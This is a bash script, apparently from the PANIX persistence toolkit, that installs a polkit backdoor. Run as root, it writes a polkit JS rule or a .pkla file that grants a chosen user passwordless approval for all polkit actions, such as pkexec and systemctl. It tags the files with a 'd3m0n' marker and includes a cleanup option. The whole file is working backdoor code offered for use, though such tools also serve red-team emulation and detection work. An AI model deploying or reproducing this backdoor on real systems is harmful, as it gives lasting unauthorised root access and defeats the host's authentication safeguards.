#!/bin/bash
#
# Polkit Privilege Escalation Backdoor (T1548)
# Drop permissive polkit rules for passwordless privilege escalation
# Source: PANIX
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_polkit"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║      Polkit Privilege Escalation Backdoor (T1548)     ║"
echo "  ║   Grant passwordless pkexec / systemctl for any user  ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Install polkit JS rule (polkit >= 0.106)"
echo -e "  ${CYAN}[2]${NC} Install polkit .pkla rule (older polkit)"
echo -e "  ${CYAN}[3]${NC} Check polkit version"
echo -e "  ${CYAN}[4]${NC} Cleanup"
echo ""
read -p "Choice [1-4]: " OPT

case "$OPT" in
    1)
        RULES_DIR="/etc/polkit-1/rules.d"
        mkdir -p "$RULES_DIR" 2>/dev/null

        read -p "Username to grant privileges [$(whoami)]: " BUSER
        BUSER="${BUSER:-$(whoami)}"

        RULE_FILE="${RULES_DIR}/49-d3m0n-nopasswd.rules"

        cat > "$RULE_FILE" << EOF
// ${MARKER}
polkit.addRule(function(action, subject) {
    if (subject.user == "${BUSER}") {
        return polkit.Result.YES;
    }
});
EOF

        echo -e "${GREEN}[+] Polkit JS rule installed: ${RULE_FILE}${NC}"
        echo -e "${GREEN}[+] User '${BUSER}' can now run pkexec without password${NC}"
        echo -e "${YELLOW}[*] Test: su - ${BUSER} -c 'pkexec id'${NC}"
        ;;
    2)
        PKLA_DIR="/etc/polkit-1/localauthority/50-local.d"
        mkdir -p "$PKLA_DIR" 2>/dev/null

        read -p "Username to grant privileges [$(whoami)]: " BUSER
        BUSER="${BUSER:-$(whoami)}"

        PKLA_FILE="${PKLA_DIR}/d3m0n-nopasswd.pkla"

        cat > "$PKLA_FILE" << EOF
[${MARKER}]
Identity=unix-user:${BUSER}
Action=*
ResultAny=yes
ResultInactive=yes
ResultActive=yes
EOF

        echo -e "${GREEN}[+] Polkit .pkla rule installed: ${PKLA_FILE}${NC}"
        echo -e "${GREEN}[+] User '${BUSER}' can now bypass polkit auth${NC}"
        ;;
    3)
        if command -v pkaction >/dev/null 2>&1; then
            VER=$(pkaction --version 2>&1 | head -1)
            echo -e "${GREEN}[+] $VER${NC}"
            echo -e "${YELLOW}[*] >= 0.106: Use JS rules (option 1)${NC}"
            echo -e "${YELLOW}[*] < 0.106: Use .pkla files (option 2)${NC}"
        else
            echo -e "${RED}[-] polkit not installed${NC}"
        fi
        ;;
    4)
        echo -e "${YELLOW}[*] Removing D3m0n polkit rules...${NC}"
        for dir in /etc/polkit-1/rules.d /etc/polkit-1/localauthority/50-local.d; do
            find "$dir" -name "*d3m0n*" -type f 2>/dev/null | while read -r f; do
                echo -e "  Removing: $f"
                rm -f "$f"
            done
        done
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
